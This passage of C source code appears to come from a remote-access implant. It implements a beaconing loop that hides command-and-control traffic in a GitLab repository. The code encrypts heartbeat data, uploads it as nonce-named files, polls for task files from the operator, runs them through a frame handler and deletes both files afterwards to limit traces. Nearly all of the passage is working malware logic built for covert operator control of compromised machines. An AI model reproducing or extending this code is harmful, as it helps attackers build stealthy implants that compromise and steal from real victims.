                        ul[5] = 2;
                        gitlab_send_result_upload(a, 0, NAX_STATUS_OK, ul, sizeof(ul));
                        if (p->ssl) { SSL_shutdown((SSL*)p->ssl); SSL_free((SSL*)p->ssl); }
                        close(p->sock);
                        *pp = p->next;
                        free(p);
                    } else {
                        pp = &p->next;
                    }
                }
            }

            /* Upload c_<nonce>.dat */
            char nonce[17]; gen_nonce(nonce, sizeof(nonce));
            char c_name[32], r_name[32];
            snprintf(c_name, sizeof(c_name), "c_%s.dat", nonce);
            snprintf(r_name, sizeof(r_name), "r_%s.dat", nonce);

            /* Encrypt body if present */
            uint8_t *body_enc = NULL;
            uint32_t body_enc_len = 0;
            if (body && body_len > 0) {
                uint32_t bcap = body_len + NAX_AES_IV + NAX_AES_BLOCK + 32;
                body_enc = (uint8_t *)malloc(bcap);
                if (body_enc) {
                    body_enc_len = bcap;
                    if (nax_encrypt(a->cfg.aes_key, body, body_len,
                                    body_enc, &body_enc_len) < 0) {
                        free(body_enc);
                        body_enc = NULL;
                        body_enc_len = 0;
                    }
                }
                free(body);
                body = NULL;
            }

            uint32_t file_len = 0;
            uint8_t *file = build_upload_file(session_uid, beat_enc, beat_enc_len,
                                              body_enc, body_enc_len, &file_len);
            free(beat_enc);
            if (body_enc) free(body_enc);
            if (!file) continue;

            DBG("HEARTBEAT: uploading %s (%u bytes)", c_name, file_len);
            int rc = -1;
            for (int _retry = 0; _retry < 5; _retry++) {
                if (_retry > 0) {
                    DBG("HEARTBEAT: upload conflict, retrying in %ds (attempt %d/5)", _retry, _retry + 1);
                    sleep_ms((uint32_t)(_retry * 1500));
                }
                rc = gitlab_upload(c_name, file, file_len);
                if (rc == 0) break;
            }
            free(file);
            if (rc < 0) {
                DBG("HEARTBEAT: upload failed after retries — re-registering");
                break;
            }

            /* Poll for r_<nonce>.dat (tasks) */
            uint32_t resp_len = 0;
            uint8_t *resp = gitlab_poll_response(r_name, &resp_len);
            gitlab_delete(c_name);

            if (resp && resp_len > 0) {
                handle_server_frame(a, resp, resp_len);
                free(resp);
                gitlab_delete(r_name);
            }
        }
    }

    curl_global_cleanup();
}

#endif /* NAX_GITLAB_MODE */
